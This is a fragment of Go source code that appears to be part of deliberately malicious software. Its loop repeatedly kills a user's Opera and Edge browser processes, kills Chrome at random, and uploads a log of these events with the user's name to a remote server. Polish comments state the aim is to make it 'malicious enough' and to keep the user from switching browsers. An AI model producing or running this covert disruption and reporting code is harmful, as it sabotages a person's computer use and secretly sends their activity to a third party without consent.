package main

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"time"
)

func terminationLoop(userName string) {
	fmt.Println("starting termination loop")
	eventsDumped := time.Now()
	var events []string
	for {
			time.Sleep(5 * time.Minute)

			// disturbing chrome and opera use
			randInt, err := rand.Int(rand.Reader, big.NewInt(10))
			if err != nil {
				panic(0)
			}
			if randInt.Cmp(big.NewInt(0)) == 0 {
				terminationMsgs := terminateProcesses([]string{"chrome", "opera", "edge"})
				events = append(events, terminationMsgs...)
			}

			// todo tymczas, wywalic gdy powyzsze bedzie juz dosc zlosliwe.
			// to jest zeby nie przeszedl od razu na opere albo edge
			// chrome jest zabijany raz po raz a opera i edge zawsze
			terminationMsgs := terminateProcesses([]string{"opera", "edge"})
			events = append(events, terminationMsgs...)

			// dumping events to server
			if len(events) > 200 || (time.Since(eventsDumped) > 30*time.Minute && len(events) > 0) {
				err := sendFakeShot(userName, "frequent events:\n"+join(events, "\n"))
				if err != nil {
					fmt.Println("couldn't sent events ", err.Error())
					events = addEvent(events, "cannot dump events")
				} else {
					events = []string{}
				}
				eventsDumped = time.Now()
			}
		}
	}
